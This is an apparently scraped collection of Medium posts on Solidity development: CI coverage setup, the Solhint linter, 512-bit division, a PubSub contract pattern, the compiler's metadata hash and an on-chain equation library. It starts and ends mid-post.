contracts..travis.ymlsudo: requiredlanguage: node_jsnode_js:  - \"8\"services:  - dockerbefore_install:  - docker pull trufflesuite/ganache-cli  - docker run -d -p 8545:8545 trufflesuite/ganache-cli:latest -h 0.0.0.0install:  - npm install -g truffle  - npm install -g coveralls  - npm installscript:  - npm run coverage && cat coverage/lcov.info | coverallsThe highlighted line above is where the tests and code coverage is being ran. This makes use of a script we have defined in our package.json file.\u201dcoverage\u201d: \u201c./node_modules/.bin/solidity-coverage\u201dWe\u2019re using a module called solidity-coverage which is an npm module which we have listed as a dev dependency in the package.json file.After the coverage script has ran and saved its output to a coverage directory, we read out the contents of a file in there called lcov.info and send it to the coveralls module. This module is responsible for interpreting and sending our test coverage output to the coveralls website.As we can see below in our coveralls report, we have 100% coverage on 3 of our contracts, and 1 (EdgeFund.sol) which needs a bit more attention.coveralls.io coverage report for edgefund-core repository master branchAll in all it took us less than 1 hour to get everything hooked up and connected with Travis and Coveralls and now we have a continuous integration process where we can see the affect our changes have on our overall coverage percentage. This is especially useful when it comes to reviewing pull requests. We can see for example if someone has added a new feature, but has forgotten to add associated tests.It\u2019s unlikely you\u2019ll have 100% test coverage across all code paths, nor should it be expected, but being able to see the affect code changes have on the overall percentage is definitely a useful thing to be aware of when developing a new smart contract.\u2014If you found this article interesting, please give it some claps and follow me on Medium to see more content like this.I am currently working on EdgeFund, an open-source platform which offers a decentralized shared bankroll on the Blockchain. To learn more about EdgeFund, please visit our website or join our telegram group to chat to the team and be sure to follow us on Twitter!", "responses": 2, "tags": ["Programming", "Ethereum", "Solidity", "Smart Contracts", "Continuous Integration"]}, {"title": "Solhint: An Advanced Linter for Ethereum\u2019s Solidity", "post_link": "https://medium.com/protofire-blog/solhint-an-advanced-linter-for-ethereums-solidity-c6b155aced7b?source=search_post", "author_name": "ProtoFire.io", "author_link": "https://medium.com/@ProtoFire_io", "publish_date": "2017-10-19", "last_modified_date": "2019-01-29", "readtime": "3.91", "claps": 345, "voters": 27, "content": "Solhint: An Advanced Linter for Ethereum\u2019s SolidityProtoFire.ioFollowOct 19, 2017 \u00b7 4 min readThe linting solutions available for detecting code vulnerabilities of the Solidity programming language \u2014 underlying smart contracts in Ethereum \u2014 mostly focus on the code compliance with the best linting practices. This blog post overviews a comprehensive Solhint linter that allows for detecting syntax-related security code vulnerabilities. Covering a wide range of validation rules, the tool also enables developers to add new ones, while complying with the Solidity style guide and granting 2x\u20134x boost in performance.Security issues with smart contractsSolidity is a high-level programming language the Ethereum smart contracts are written in. The language is designed to create contracts for multi-signature wallets, voting, crowdfunding, blind auctions, etc.As the Ethereum\u2019s system of smart contracts is still evolving, the security issue is a top priority. The recently reported Parity Multi-Sig Wallet Attack and Reentrance Attack indicate the need to enhance protection.Using automatic syntax checks makes it possible to detect code vulnerabilities and prevent attacks. However, it is important to ensure that your code complies with the Solidity style guide, is readable, and can be easily maintained.For checking security rules, you can use the solcheck linter, while Solium can assist you in verifying compliance with the style guide. However, the sets of rules offered by these tools are not comprehensive enough to guarantee that a code is safe and of proper quality.Being in the need of a tool that will provide a complete and up-to-date set of rules for checking security, as well as validating compliance with the style guide and usage of best practices. So, we set out to work on it.The new advanced linterA month of development resulted in the Solhint solution \u2014 a library and a command line tool for static analysis of the Solidity code. Unlike alternatives that mostly focus on checking if the Solidity code complies with the best coding practices, the delivered linter allows for detecting syntax-related security vulnerabilities, supports a wide range of rules, as well as enables to add new ones if necessary.Solhint uses an antlr4-based implementation of the Solidity parser that enables efficient parsing and validation performance. In comparison to other linting solutions, we have achieved a 2x\u20134x performance boost while linting the source code.In addition, the tool features flexible configuration options:Using a preconfigured set of rulesCustomizing default rule sets with the .solhint.json fileManaging the configuration rules at the code level, using special comments (e.g., \u201csolhint-disable-line\u201d)How it worksFirst, we need to install the tool. To do that, run the command below.npm install -g solhintsolhint -hThis will return the following output.Usage: solhint [options] <file> [\u2026other_files]Linter for Solidity programming language Options:   -V, \u2014 version            output the version number   -f, \u2014 formatter [name]   report formatter name   -h, \u2014 help               output usage information Commands:   stdin [options]    put source code to stdin of this utility    init-config        create sample solhint config in current folderThe tool has three major commands:By default, it receives a list of the file patterns (**/*.sol, *.sol) and runs an analysis.It is possible to provide a validating source code to STDIN of this application with the stdin command.The init-config command allows to create a basic configuration file that can be customized if needed.Now, let\u2019s try to lint some code with the following command:>solhint **/*.solFor instance, we want to change the first notification (highlighted in red) from \u201cerror\u201d to \u201cwarning.\u201d To do that, we need to create a configuration file and change the \u201ccompiler-fixed\u201d option to \u201cwarn.\u201dTo create a configuration file, run the following command.> solhint init-configYour current directory will display the .solhint.json file. You can modify it as shown below:{  \u201cextends\u201d: \u201cdefault\u201d,  \u201crules\u201d: {    \u201ccompiler-fixed\u201d: \u201cwarn\u201d  }}Next time you run the solhint validation, you will get the following output:If you need to disable the validation for an error line, you should add the \u201csolhint-disable-line\u201d comment in this line. After that, you will see:test.solfor (uint i = 0; i<bresult.length; i++) { // solhint-disable-lineFinally, we have provided integration with such text editors as Sublime Text and Atom. The delivered plugins enable developers to automatically analyze source code and highlight the elements with errors.Furthermore, one can now see the error description on hovering the highlighted element with a mouse.Complying with the Solidity style guide, the Solhint linter enables developers to detect security vulnerabilities of the Solidity code across multiple validation rules and expanding the list of them if required, while enjoying a 2x\u20134x performance boost in comparison to alternative solutions.", "responses": 1, "tags": ["Solidity", "Smart Contracts", "Ethereum", "Blockchain"]}, {"title": "Mathemagic: 512-bit Division", "post_link": "https://medium.com/wicketh/mathemagic-512-bit-division-in-solidity-afa55870a65?source=search_post", "author_name": "Remco Bloemen", "author_link": "https://medium.com/@recmo", "publish_date": "2017-12-19", "last_modified_date": "2018-06-11", "readtime": "4.84", "claps": 367, "voters": 26, "content": "Mathemagic: 512-bit DivisionRemco BloemenFollowDec 19, 2017 \u00b7 5 min readIn the previous posts, I introduced the Chinese Remainder Theorem and used it to build a full multiplication function. In this post, I will introduce five small tricks and use them to build a simple division algorithm.Find the Largest Power of Two Divisor of a Given NumberGiven a number a. Find the largest power of two, r = 2\u207f, that divides a given number. Equivalently, find a number r such that a / r is an exact division and its quotient is an odd number.The answer is -a & a. It is hard to explain mathematically because it combines arithmetic with bitwise operations. But an example in binary makes it intuitively clear:The key insight is that negation flips all high bits of a number up to but not including the least significant one. A simple and then removes all the flipped bits and we are left with only the least significant one.For completeness, I\u2019ll present it in Solidity as well:Compute the largest power of two dividing a numberFor zero there is no divisor, and the function returns zero. For odd numbers, it returns one. This makes sense as it is the largest power of two (1 = 2\u2070) that divides the number.Divide 2\u00b2\u2075\u2076 by a Given NumberThe number 2\u00b2\u2075\u2076 is fundamental to working with the Ethereum virtual machine, so it\u2019s useful to do some tricks with it. It can not be expressed directly, but we can express fractions of it. For a given number a, we can compute 2\u00b2\u2075\u2076 divided by a. For this I found a trick involving negated numbers:Implemented in Solidity and optimized, this becomes:Divide \u00b2\u00b2\u2075\u2076 by a given numberFor the answer to be defined and fit in a single word, a needs to be larger than one. The assembly is to avoid a redundant zero check on division.Compute 2\u00b2\u2075\u2076 Modulo a Given NumberLike the previous, we can also compute the remainder of 2\u00b2\u2075\u2076 divided by a instead of the quotient. The same trick with negation works:Again, in Solidity:Remainder of 2\u00b2\u2075\u2076 divided by a given numberThe answer always exists for non-zero a and is strictly less than a. The assembly is to avoid a redundant zero check.Add / Subtract Two 512-bit NumbersThe multiplication algorithm from before produces 512-bit numbers. To add two such numbers we can use an expression like:Simple 512-bit additionThe second line has an extra term that checks for carry and adds it. It takes about 65 gas. The Solidity compiler (v. 0.4.18) does not produce optimal code here. The ternary expression turns in to a branch. We can avoid this. Observe the yellow paper definition of the LT, the less-than instruction:This function already returns zero or one exactly as we want it. We can thus add it directly. Casting a boolean to a number is not allowed in Solidity, so we need to switch to assembler again:Add two 512 bit numbersThis function takes only 10 gas (when measured by comparing to a function returning zero). Similarly for subtraction:Subtract 512-bit numbersDividing a 512-bit Number by a 256-bit NumberTo show the usefulness of the above functions, I\u2019ll make a simple division algorithm. We want to build a 512-by-256-bit division function, that is, we want to compute x such that:Where a\u2080 and a\u2081 are the lower and higher half of the 512-bit number and b is the 256-bit number. The result, x, will also be 512-bit. So it is also split into its low and high bits x\u2080 and x\u2081.To solve it, first, we observe the following. With the div256 and mod256 functions we can compute two numbers q = div256(b) and r = mod256(b) . These then satisfy:If we substitute this identity in the fraction, we can split out a term:Because r is smaller than 2\u00b2\u2075\u2076, the new numerator is smaller than the one we had before \u2014 we made some progress. We can keep repeating this process. Each time splitting of a term and computing the new numerator. Eventually, we reach a point where the new x\u2081 is zero. When that happens we do a regular division of x\u2080 by c. The final result is the sum of all the x\u2081 \u00b7 q terms and the final division. This creates an elegant algorithm:512-by-256-division for b > 1How many iterations does the loop take? In the worst case is r is as large as possible because then we \u2018scale back\u2019 x\u2081 by the smallest amount. The largest r can get is 2\u00b2\u2075\u2075 \u2014 1, when c equals 2\u00b2\u2075\u2075 + 1. This means x\u2081 is at least halved every iteration. Since x\u2081 is 256-bit, it takes at most 256 iterations.As presented, it requires b > 1. A special case for b = 1 is easily added, just return the input (a\u2080, a\u2081).I did a bit of searching, but could not find this approach to division in the literature; a division algorithm where the radix is rewritten in terms of the denominator. Please tell me if you know one.With these five new tools, we are developing a nice toolbox. We can already tackle some interesting problems. The division algorithm shown here is not optimized because there are better approaches. The really good ones require one more tool, modular inverses, which I will present in the next post.If you enjoy these posts and/or want to encourage me to write more, please clap & follow!", "responses": 1, "tags": ["Mathematics", "Smart Contracts", "Blockchain", "Ethereum", "Solidity"]}, {"title": "PubSub Pattern in Solidity Smart Contracts", "post_link": "https://medium.com/rocket-pool/pubsub-pattern-in-solidity-smart-contracts-32012b9881b4?source=search_post", "author_name": "Jake Pospischil", "author_link": "https://medium.com/@moles", "publish_date": "2018-11-28", "last_modified_date": "2018-12-03", "readtime": "4.04", "claps": 161, "voters": 27, "content": "PubSub Pattern in Solidity Smart ContractsJake PospischilFollowNov 28, 2018 \u00b7 5 min readMom\u2019s SpaghettiRocket Pool is a complex beast with many interlocking parts. After spending some time working on the shiny, new Rocket Pool 2.0, we found that we had a number of contracts which needed to know about changes in others. Until recently, we had simply called their methods directly from external code, to alert them to these changes. This works, but it results in tight coupling between contracts and can make code difficult to follow and maintain.An example of this tight coupling is the interaction that was present between two main Rocket Pool smart contracts: RocketPool.sol and RocketMinipool.sol. These two files manage some important aspects of Rocket Pool and each needs to be aware of changes that happen in the other.For instance, a RocketMinipool contract changes its status several times throughout its lifetime, from the \u201cinitialised\u201d state, to \u201cstaking\u201d with Casper, and so on. The RocketPool contract needs to be notified of these status changes in order to perform tasks like assigning user deposits correctly. Previously, we accomplished this by having RocketMinipool.sol call RocketPool.sol\u2019s methods directly whenever its status changed, making any necessary updates to its state.Let\u2019s look at our na\u00efve implementation of updating the available minipool set:Updating the available minipool setThis is something we\u2019d like to avoid, but until very recently, that was almost impossible. With the introduction of Solidity 0.5.0 just a few weeks ago, we can now leverage some design patterns to decouple these contracts. Let\u2019s go ahead and unravel this spaghetti code!No More TanglesWe\u2019ll enlist the help of an old standby for decoupling code: the Publish-Subscribe (or PubSub) design pattern. Note that this differs subtly from the venerable Observer pattern, in that we\u2019ll use a single, global Publisher contract to broadcast messages. This will help keep our code lean, as we won\u2019t need to extend a Publisher base class for every contract which needs to communicate with others.Here\u2019s our initial attempt at the PubSub contracts:Initial PubSub implementationAll references to storage are based on our upgradeable contract design pattern \u2014 a great way to improve contract design architecture if you\u2019re concerned with upgradeability.Note that modifiers have been applied to these methods to prevent access from arbitrary addresses, but have been omitted for brevity. We want to ensure that only we can modify the subscriber list, and only the subscriber contract can call corresponding notify methods!Here\u2019s our updated RocketMinipool and RocketPool contract code:Updating the available minipool set via PubSub\u2026 almostWe\u2019ve successfully decoupled these contracts. At deployment, we send a transaction to Publisher.addSubscriber to subscribe the RocketPool contract to the \"minipool.status.change\" event. Then, whenever a minipool\u2019s status changes:It calls Publisher.publish with the \"minipool.status.change\" event nameThe publish method loops through the set of all contracts subscribed to the event, and calls the SubscriberInterface.notify method on each of themRocketPool.notify is called, and can handle the event accordinglyThere\u2019s just one problem \u2014 the RocketPool contract needs know the minipool\u2019s address and new status in order to correctly add it to, or remove it from, the available set. We\u2019ll need to pass this information along with the event, but we\u2019d have to overload a couple of methods to do that:Overloaded PubSub implementationThis is far from ideal \u2014 we don\u2019t want to have to overload our publish and notify methods for every different set of parameters we\u2019re sending with our events. This is where tools like variadics / generics help in languages like C++ and Rust, but we don\u2019t have that technology yet for Solidity. And even if we could dynamically generate the required methods at compile-time, we\u2019d end up with some pretty heavy contract bytecode, which might not play well with EIP-170!If only we could pass some arbitrary, encoded data in a single parameter, and decode it at runtime instead. But there aren\u2019t any cheap, concise encoding utilities available in Solidity, right? Wrong!Solc v0.5.0 to the Rescue!Among the numerous updates to Solidity 0.5.0 is a new abi.decode function, complementing the existing abi.encode one. We can now pack some arbitrary data into a byte array, pass it to another function, and easily reconstruct the data in its original form.Let\u2019s see what the updated PubSub code looks like:Solidity 0.5.0 PubSub implementationAnd once again, our updated RocketMinipool and RocketPool contract code:Final updating available minipool set implementationOf course, the abstractions we have introduced aren\u2019t free. However, benchmarking the gas costs of transactions which invoke the Publisher contract shows only a 5% increase in gas usage! In our opinion, this is a small price to pay for a design pattern which helps to keep code malleable and maintainable, and ensures that concerns are properly separated within a project.Final ThoughtsIt\u2019s easy to dismiss the idea of using abstractions when working with the EVM; you could be forgiven for thinking that some design patterns simply aren\u2019t viable due to the heavy focus on performance and optimisation. However, we discovered that it\u2019s worth exploring all the options before writing them off \u2014 you might be surprised what you can do!Of course, if you decide to use similar patterns in your own projects, it\u2019s important to carefully consider the risks associated with decoding data at runtime. Make sure that you have total control over the data that gets passed to abi.decode, and account for all the possible calls to it with a robust suite of unit tests!Questions and HellosIf you have questions or want to know a bit more about us, why not swing by for a chat and say G\u2019day! You can view our website or have a chat with us in our chat room that anyone can join. If chat rooms aren\u2019t your thing, we\u2019re also on Twitter!The gists embedded in this article are simplified versions of our contract code \u2014 to see the full versions in action, check out the Rocket Pool git repo!", "responses": 1, "tags": ["Ethereum", "Blockchain", "Ethereum Blockchain", "Proof Of Stake", "Solidity"]}, {"title": "Deconstructing a Solidity Contract \u2014 Part VI: The Metadata Hash", "post_link": "https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-vi-the-swarm-hash-70f069e22aef?source=search_post", "author_name": "Alejandro Santander", "author_link": "https://medium.com/@_ajsantander", "publish_date": "2018-09-28", "last_modified_date": "2019-02-13", "readtime": "7.03", "claps": 253, "voters": 26, "content": "Deconstructing a Solidity Contract \u2014 Part VI: The Metadata HashAlejandro SantanderFollowSep 28, 2018 \u00b7 8 min readBy Alejandro Santander in collaboration with Leo AriasImage from pixbay.comNote: This article is part of a series. If you haven\u2019t read the previous article, please have a look at it first. We\u2019re deconstructing the EVM bytecode of a simple Solidity contract.Deconstructing a Solidity Contract \u2014 Part I: Introduction \u2714Deconstructing a Solidity Contract \u2014 Part II: Creation vs. Runtime \u2714Deconstructing a Solidity Contract \u2014 Part III: The Function Selector \u2714Deconstructing a Solidity Contract \u2014 Part IV: Function Wrappers \u2714Deconstructing a Solidity Contract \u2014 Part V: Function Bodies \u2714Deconstructing a Solidity Contract \u2014 Part VI: The Metadata Hash \u2b05Update: This article initially contained mistakes and missed a few important points about the design of the metadata hash, which were pointed out by chriseth from the Solidity team. Thank you! Among the corrections made by Chris, is the fact that the structure is known as the \u201cMetadata hash\u201d instead of the \u201cSwarm hash\u201d, and that the Solidity compiler is agnostic in terms of the system used to store contract metadata.In the last article, we noticed that the runtime bytecode generated by the Solidity compiler appends a strange structure after the function bodies block. You can see this in the deconstruction diagram or in the image below referred to as the \u201cmetadata hash\u201d:Figure 1: The metadata hash can be found in the last few opcodes of the runtime bytecode of a contract.What exactly are these opcodes doing?Notice the STOP opcode at instruction 421. You may think that if there\u2019s a STOP opcode there, whatever comes after it is basically unreachable bytecode, right? Well, not exactly: the code could be JUMP-ing over the STOP opcode. However, there are no JUMPDEST instructions after it, so that rules out the possibility of any execution reaching this part of the bytecode via a JUMP.In fact, if you analyze all the possible execution flows in this contract (which, believe it or not, is what we have done in this series!), you\u2019ll see that indeed this code is totally unreachable.So why would the Solidity compiler append non-executable code to its generated output? Actually, this isn\u2019t the first time that this happens. We\u2019ve seen it before in Part II of the series, where a constructor\u2019s arguments were appended to the end of the creation bytecode. That code wasn\u2019t supposed to be executed by the EVM either; it was just there as a sort of hack to store the initialization values of a contract for consumption in constructors.Alright, we still haven\u2019t answered the question of what this block of code is. To do that, let\u2019s walk through the opcodes and try to make some sense out of them, shall we?The first thing we see is a LOG1. If we look this opcode up in the Yellow Paper or in the Solidity documentation, we can see that LOG0 to LOG4 opcodes are used for logging events in the Ethereum blockchain. Which\u2026makes no sense, since we won\u2019t be executing any of this code...After that, we can see a PUSH6 of 0x627a7a723058, a SHA3, a couple of INVALIDs, a SWAP10, a DELEGATECALL, etc. Wait, INVALIDs? What does that even mean?! Yup, total nonsense in terms of EVM interpretation. Clearly, looking at these bytes as EVM opcode representation is absolutely pointless. We need to look at this as raw byte data, which as you remember can be found in Remix\u2019s Compile tab > Details panel > Runtime Bytecode section > object property. The LOG1 opcode is really an 0xa1 byte, so the whole block of code at the end of the contract looks like this:// \u2026a165627a7a723058202c27c1ef4be478b21f663f0d0ecdd1c73638730ffebbff1e3c7a234db7df6fd10029// END OF CONTRACTThe answer to this riddle can be found in Solidity\u2019s documentation, in the Encoding of the Metadata Hash in the Bytecode section. The documentation is brief, but it gives us exactly what we need. The compiler is hashing the contract\u2019s metadata (which includes information about the contract such as its source code, how it was compiled, etc.) and injecting this hash into the contract\u2019s own bytecode! This metadata can also be seen in Remix: Remix\u2019s Compile tab > Details panel > Metadata section.This hash can be used in Swarm as a lookup URL to find the contract\u2019s metadata. Swarm is basically a decentralized storage system, similar to IPFS. The idea here is that some platform like Etherscan identifies this structure in the bytecode and provides the location of the bytecode\u2019s metadata within a decentralized storage system. A user can query such metadata and use it as a means to prove that the bytecode being seen is in fact the product of a given Solidity source code, with a certain version and precise configuration of the Solidity compiler in a deterministic manner. This hash is a digital signature of sorts, that ties together a piece of compiled bytecode with its origins. If you wanted to verify that the bytecode is legit, you would have to hash the metadata yourself and verify that you get the same hash.And that\u2019s not all, the metadata hash can be used by wallet applications to fetch the contract\u2019s metadata, extract it\u2019s source, recompile it with the compiler settings used originally, verify that the produced bytecode matches the contract\u2019s bytecode, then fetch the contract\u2019s JSON ABI and look at the NATSPEC documentation of the function being called.This end-to-end authentication path built into bytecode generated by the Solidity compiler can not only be used to provide a user with information of the action about to be performed, but also to validate the legitimacy of such action.For example, if we look at the CryptoKitties contract in Etherscan, we can see that at the end of the page, Etherscan provides us with the contract\u2019s metadata address in Swarm, which was extracted from the bytecode in the way we\u2019ve just seen: bzzr://a6465fc1ce7ab1a92906ff7206b23d80a21bbd50b85b4bde6a91f8e6b2e3edde. You can look into Swarm\u2019s documentation to better understand this URL scheme.Let\u2019s go back to our BasicToken\u2019s bytecode and understand how Etherscan (or any other similar utility for that matter) actually finds the hash in the bytecode.As the Solidity documentation states, an 0xa1 and an 0x65 will be injected to the bytecode. In EVM bytecode, these two hexadecimal values would translate to LOG1 and PUSH6. Now, if we decoded the letter \u201cb\u201d as UTF to hex, we would get 0x62, \u201cz\u201d would be 0x7a, and so on. You can see the whole thing decoded in the following diagram:Figure 2: The metadata hash decoded as a Swarm URL.So, any application trying to find the metadata hash in the bytecode would look for these bytes at the end of the contract, this particular pattern, and extract the URL from it.Solidity uses a type of encoding called CBOR encoding, with which not only the hash is stored, but the specific decentralized storage system and version used is stored. In this case, it\u2019s using Swarm\u2019s version zero bzz:// URL scheme and that\u2019s why the structure contains the chars \u201cb\u201d, \u201cz\u201d, \u201cz\u201d, \u201cr\u201d, \u201c0\u201d. Alternatively, it could use something like \u201ci\u201d, \u201cp\u201d, \u201cf\u201d, \u201cs\u201d, \u201cr\u201d, \u201c0\u201d, indicating that the structure encodes an IPFS URL scheme. This makes it agnostic in terms of which storage system is used. It could be changed in the future, or we could even get to choose which storage system we want the bytecode to reference upon compilation.To retrieve the metadata file, we would have to connect to the same Swarm network to which the metadata file was uploaded to, using something like swarm-gateways.net or setting up a local Swarm node. Right now, this is something that is quite difficult to do, because Swarm is still under heavy development and has not yet stabilized its hashing scheme, which can be seen is something being addressed by Solidity in issue #4092.The actual hash itself is a specific hashing algorithm executed on the metadata file of a contract, which the Solidity compiler calculates after it has run all its other tasks \u2014 mainly, compiling =D. When we were trying to interpret these bytes as EVM opcodes, some of the hash\u2019s bytes didn\u2019t have a corresponding opcode, and that\u2019s why we were getting INVALIDs. In fact, a hash may just by chance produce any set of opcodes, which will make all hashes different and look weird when using tools like Remix. What I do is ignore the bytecode when I see a LOG1, followed by a PUSH6 and a few INVALIDs, understanding that what I am seeing is the metadata hash injection that the Solidity compiler makes.And this concludes our analysis of this bizarre structure found at the end of every contract produced by Solidity.Better yet, this concludes the entire series. Yay! If you followed along and digested this considerable amount of highly technical, horrendously boring material (at least to most people), then I salute you! I hope that by now you feel right at home when you see EVM bytecode in the wild, and that you add this skill to your toolset when analyzing and developing smart contracts for Ethereum.Thanks for reading!Deconstructing a Solidity Contract \u2014 Part I: Introduction \u2714Deconstructing a Solidity Contract \u2014 Part II: Creation vs. Runtime \u2714Deconstructing a Solidity Contract \u2014 Part III: The Function Selector \u2714Deconstructing a Solidity Contract \u2014 Part IV: Function Wrappers \u2714Deconstructing a Solidity Contract \u2014 Part V: Function Bodies \u2714Deconstructing a Solidity Contract \u2014 Part VI: The Metadata Hash \u2714Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 1, "tags": ["Ethereum", "Solidity", "Swarm", "Ipfs", "Guides"]}, {"title": "Encoding and Evaluating Mathematical Expression in Solidity", "post_link": "https://medium.com/bandprotocol/encoding-and-evaluating-mathematical-expression-in-solidity-f1bb062fa86e?source=search_post", "author_name": "Sorawit Suriyakarn", "author_link": "https://medium.com/@sorawit", "publish_date": "2019-02-25", "last_modified_date": "2019-03-25", "readtime": "8.76", "claps": 798, "voters": 28, "content": "Encoding and Evaluating Mathematical Expression in SoliditySorawit SuriyakarnFollowFeb 25 \u00b7 9 min readTLDR: We developed a library for encoding and evaluating math expression on-chain. Bonding curve demo contract is available Rinkeby testnet. Check it out!At Band Protocol, we are building a set of tools to enable effective information curation in decentralized communities. One of the challenges we faced while developing the first version of Band Protocol on Ethereum is how to store and evaluate arbitrary mathematical expressions on-chain. In this article, we will go over Band Protocol\u2019s take on solving this problem using on-chain expression trees. The end goal is to have a Solidity library that can store and evaluate arbitrary expressions with single variable (example below) on the blockchain.Example of complex math expression to evaluate on chain with Solidity (generated with Wolfram|Alpha)Use CasesBonding curve: Bonding Curve token issuance contract could use the library to power its logic. Existing implementations, such as the ones from Bancor and Relevant, only permit exponential reserve-ratio equations. With our library, the set of possible bonding equations expands, and people can start experimenting more things.Token vesting schedule: The current goto smart contract for token vesting, implemented by OpenZeppelin, assumes the standard cliff then linear vesting schedule. While this is sufficient in most cases, it does not support common features like monthly vesting. By formulating as a mathematical expression, the contract could support more flexible vesting schedules while still retaining its simplicity.TCR deposit: At Band Protocol, we are exploring a variant of Token Curated Registry with independent decay for each entry\u2019s min_deposit constraint. In other words, as an entry lives longer, the required deposit decreases. Equation library can be used to dictate decay rate.Specification, and Design GoalsWith that, we aim for the library the have the following interface containing two functions.library Equation {  // Abstract data type that encapsulates a mathematical expression  struct Data {    ...  }      // Initialize this expression from some TBD kinds of arguments  function init(Data storage self, ... some arguments ...);      // Evaluate this expression with given value 'x' in the expression  function calculate(Data storage self, uint256 x);}There are three main design goals that we would like the library to achieve. (Hint: we achieved all of them)Simplicity: Running on an immutable ledger with potential high stake, the library should be simple and easy to understand. Ultimately in the future, we would like the evaluation rules and implementations to be formally verifiable and provable correct.Extensibility: The representation must be generic and extensible. Adding new building blocks for a new kind of equations should be simple and not disruptive.Efficiency/Scalability: Last but not least, since expression evaluations are done on-chain. Gas cost must be reasonable. We expect the library to take less then 10,000 gas for each expression evaluation. That\u2019s lower than storing a single word on the blockchain!Introducing N-nary Expression TreeWe surely are not the first guys to face this problem of making sense of math expressions. In fact, most compilers and interpreters do it all the time using expression tree! An expression tree is essentially a tree in which each internal node corresponds to an operator, while each leaf node corresponds to a term (operand). The example below shows an expression and its corresponding tree. Node that each internal node can have 1, 2, or 3 children depending on its operator.Example of a function with branching, and its expression tree representationEvaluation RulesEvaluation rule is quite intuitive \u2014 very similar to how ordinary people do math. Evaluating an expression Eunder a context C (which in this case contains the value of variable x) is done by evaluating all of E\u2019s sub-expressions under C, then combine the results with E\u2019s operator. The following shows denotation semantics of some of the constructs.Formal evaluation rule of some of the opcodes currently available with the libraryParsing a readable math term to an expression treeAlgorithms like Shunting-yard algorithm can be used to process input string into its polish notation. This notation will then be passed to the library\u2019s init function as a pre-order traversal list of opcodes to instantiate the expression in Solidity, with each operator encoded to a unique integer per spec. Constants are preceded with 0opcode. Note that we intentionally abstract the parsing complication mess out of the blockchain to simplify on-chain computation. See example below for parsing x^2 + 10. The process of converting an expression string to opcode list can also be done automatically via an off-chain web application (see future work).Example of conversion from expression tree to the raw value passed to the libraryBack to Solidity World and Demo!The source is currently available at Band Protocol\u2019s smart contracts repository. In this section, we will go over it and explain the important parts of the library.Representing a Tree On-ChainA node is represented as a struct containing its opcode as well as the locations of its children or in the case of Constant, its value. The location is simply an integer specifying the location of a node in the array of all nodes. An expression is merely an array of nodes, with the zeroth node representing the root of the tree. Note that opcode is a uint8 that encodes each operator. See comment inside the library for detailed explanation.struct Node {  uint8 opcode;  uint8 child0;  uint8 child1;  uint8 child2;  uint256 value;}Note: we acknowledge that the list of pre-order traversal of opcodes can be evaluated directly, bypassing tree construction completely. See future work section below for more details.Constructing a Tree from External InputsUser instantiates an expression by passing in the polish notation encoded as a list of opcodes plus constants, which will be passed to populateTree function with currentNodeIndex = 0(the first opcode is root node). The function recursively populates . Note that in addition to consuming the list, the function also returns the sub-expression type. This acts like an ad-hoc type system, ensuring that the library won\u2019t try to compare an integer with a boolean, or try to add two booleans together, etc./** * @dev Helper function to recursively populate node information * following the given pre-order node list. It inspects the opcode  * and recursively call populateTree(s) accordingly. * * @param self storage pointer to equation data to build tree. * @param currentNodeIndex the index current node to populate info. * @return An (uint8, bool). The first value represents the last * (highest/rightmost) node index of the current subtree. The second  * value indicates the type that one would get from evaluating this  * subtree. */ function populateTree(Node[] storage self, uint8 currentNodeIndex)   private   returns (uint8, ExprType);On-Chain Expression EvaluationExpression evaluation is straightforward. We split the code into two functions, one for dealing with uint256 result and one for boolean. Each function checks the nodeIdx^th node opcode, evaluating its child sub-expressions, and returns the computed result./** * @dev Calculate the arithmetic value of this sub-expression at  * the given x value. */function solveMath(Node[] storage self, uint8 nodeIdx, uint256 xVal)  private  view  returns (uint256)    /* * @dev Calculate the boolean value of this sub-expression. */function solveBool(Node[] storage self, uint8 nodeIdx, uint256 xval)  private  view  returns (bool);    function calculate(Node[] storage self, uint256 xValue)  internal  view  returns (uint256){  return solveMath(self, 0, xValue);}Live Demo!In addition to the Equation Library implementation. We have deployed a demo token contract (BCDT token) at on Rinkeby network that anyone can buy and sell tokens using bonding curve with (fake) Ether as collateral. The collateral equation is C = x^2. With that equation, the spot price of token is P = 2x. In other words, if there are currently 10 tokens in the system, the total amount of collateralized Ether is 100 ETH, the spot price is 20 ETH per token, and buying 2 tokens would cost (12\u00b2) \u2014 (10\u00b2) = 44 ETH. The equation on chain, however, is [7, 8, 1, 0, 2, 0, 1e18], which is the encoded version of x^2 / 10^18. Note that the expression cannot be a simple x^2since the token we created, as well as Ether, has 18 decimal offset that needs to be accounted. You can buy/sell tokens right now using Etherscan or with web3 directly. See example below.// Assumes that you have window.web3 version >= 1.0 available.console.log(window.web3);// 1.0.0-beta\u2026. // Buy 1 BCDT with price limit of 10 ETH(async () => {  const account = (await window.web3.eth.getAccounts())[0];  console.log(await web3.eth.sendTransaction({    from: account,    to: '0x23bd890a2359ed4c0740932de818a0fbfecdf0b6',    // 8-byte signature + hex encode of 1e18    data: '0xd96a094a00000000000000000000000000000000000000000000' +          '00000de0b6b3a7640000',    value: '10000000000000000000',  }));  // Log receipt object after the transaction is confirmed}) (); // Sell 0.5 BCDT(async () => {  const account = (await window.web3.eth.getAccounts())[0];  console.log(await web3.eth.sendTransaction({    from: account,    to: '0x23bd890a2359ed4c0740932de818a0fbfecdf0b6',    // 8-byte signature + hex encode of 5e17    data: '0xe4849b3200000000000000000000000000000000000000000000' +          '000006f05b59d3b20000',  }));  // Log receipt object after the transaction is confirmed}) ();Estimating gas on calling getCollateralAtSupply with supply = 10^18 returns just 27732 gas! Deducting the base 21000 gas cost, this means computing the expression x^2 / 10^18 on-chain only takes around 6000 gas!(async () => {  console.log(await window.web3.eth.estimateGas({    to: '0x23bd890a2359ed4c0740932de818a0fbfecdf0b6',    // 8-byte signature + hex encode of 1e18    data: '0x06f3502000000000000000000000000000000000000000000000' +          '00000de0b6b3a7640000',  }));  // Log 27732}) ();Still a WIP. A lot more to be done!While the library has been through extensive internal tests at Band Protocol, it is very much still a work in progress. Here we list out a few of major improvements that Band Protocol plans to incorporate to our Equation Library. If you are interested in helping out, please reach out to me or open a Github pull request! Also please let us know if you have any feature requests or suggestions.Bancor Formula Construction (Fancy Exponential Computation!)One limitation of current implementation is the lack of efficient approximate exponentiation. Bancor has proposed on-chain floating point arithmetic implementation and is proven to be extremely robust. We look to incorporate the implementation as Equation Library\u2019s constructs. This will allow more sophisticated equations, such as the proposed Dynamic Bonding Curve equation, to be evaluated on chain.Getting Rid of Explicit Tree 